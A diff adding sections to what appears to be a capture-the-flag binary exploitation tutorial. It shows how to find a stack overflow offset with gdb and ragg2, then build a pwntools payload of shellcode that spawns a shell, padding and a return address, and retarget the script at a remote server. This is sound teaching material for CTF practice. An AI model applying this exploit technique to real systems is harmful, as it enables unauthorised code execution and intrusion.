@@ -214,6 +214,88 @@ Follow the previous steps to see what the value of the variable is
 now, with your payload. Check that your offset value is correct, and
 tweak until satisfied.
 
+Final step: change this line:
+```
+r = process(<binary>)
+```
+to this:
+```
+r = remote(<server addr>, <port num>)
+```
+
+and run to get the real flag
+
+
+### shellcode
+
+For shellcode, we're going to start the same way, by calculating
+how much padding we need. Instead of checking the value of a variable
+that's being overwritten, we want to see the value of the instruction
+pointer. The easiest way to do this is to run the program in `gdb` with
+our big ol' input string (`ragg2 -P 512 -r`).
+
+```
+(gdb) r
+Starting program: /home/crclark/repos/bluehens_pwning/shellcode.elf
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42416f42 in ?? ()
+```
+
+Grab that address. That's what we want to manipulate.
+
+```
+$ ragg2 -q 0x42416f42
+
+Little endian: 302
+Big endian: -1
+```
+
+Add that as our offset value. Now we can specify an address as our
+target variable, and the binary will go there.
+
+Where do we send the binary? In this type of challenge, we're going
+to execute some code that we provide, called shellcode.
+
+pwntools has a cool module that allows you to insert shellcode pretty
+easily. Getting some shellcode to add to the payload looks like this:
+
+```
+buff_addr = p32(<addr>)
+#buff_addr = p64(<addr>) for 64 bit
+
+shellcode = asm(pwnlib.shellcraft.i386.linux.sh())
+#shellcode = asm(pwnlib.shellcraft.amd64.linux.sh(),64)
+# ^^ this is for 64-bit binaries
+# check bitsize using the `file` command
+
+payload = shellcode
+payload += (offset - len(shellcode))*"A"
+payload += buff_addr
+```
+
+In this case, buff_addr is the location that our shellcode is copied.
+You can find this by looking for the call to `gets()` within the code.
+Set a breakpoint after the call and look at the stack (in visual mode)
+to see where your input shows up.
+
+Try it, tweak it, make sure the binary is actually jumping to the
+correct address. Most common issue will be needing to tweak the
+offset value until things work.
+
+Change the script to run on the remote server instead of locally:
+```
+r = process(<binary>)
+```
+```
+r = remote(<addr>,<port>)
+```
+and you'll be good to go
+
+
+
+
 
 
 
